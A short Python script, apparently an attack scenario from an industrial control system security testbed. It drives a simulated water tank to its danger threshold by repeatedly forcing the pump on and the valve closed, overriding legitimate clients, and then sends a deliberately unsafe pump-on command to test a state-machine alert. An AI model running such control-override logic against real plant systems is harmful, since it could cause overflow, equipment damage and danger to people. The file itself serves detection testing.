"""Create a safe setup, wait for high water, then reaffirm pump-on dangerously."""
from __future__ import annotations
import time
from common.config import DANGER_LEVEL_THRESHOLD
from common.client_helper import PlantClient


def run_wrong_moment(client: PlantClient, check_interval: float = 0.5, timeout_seconds: float = 90.0) -> None:
    """Drive the tank up to the high-water danger threshold and reaffirm pump-on dangerously.

    Actively enforces pump ON and valve CLOSED on each iteration to override
    any concurrent legitimate client trying to prematurely drain at normal operating levels (e.g. 78%).
    Once the tank reaches DANGER_LEVEL_THRESHOLD (>=95%), strikes with the deliberately
    dangerous redundant pump-on command, triggering a Critical Layer 2 State Machine alert.
    """
    start_time = time.time()
    client.logger.info(
        "WRONG_MOMENT_START | Actively driving tank to danger threshold (>= %.1f%%)...",
        DANGER_LEVEL_THRESHOLD,
    )

    while True:
        if time.time() - start_time > timeout_seconds:
            client.logger.error("WRONG_MOMENT_TIMEOUT | Exceeded %ss waiting for danger threshold", timeout_seconds)
            return

        level, pump_on, valve_open = client.read_state()
        if level >= DANGER_LEVEL_THRESHOLD and not valve_open:
            client.logger.warning(
                "WRONG_MOMENT_STRIKE | Tank reached danger level %.1f%% with valve closed! Injecting redundant pump-on command...",
                level,
            )
            # The deliberately dangerous command that violates the Layer 2 state machine:
            client.write_pump(True)
            client.logger.info("WRONG_MOMENT_COMPLETE | Attack executed successfully.")
            return

        # Active assertion: keep valve closed and pump on to overcome normal cycling
        client.write_valve(False)
        client.write_pump(True)
        time.sleep(check_interval)
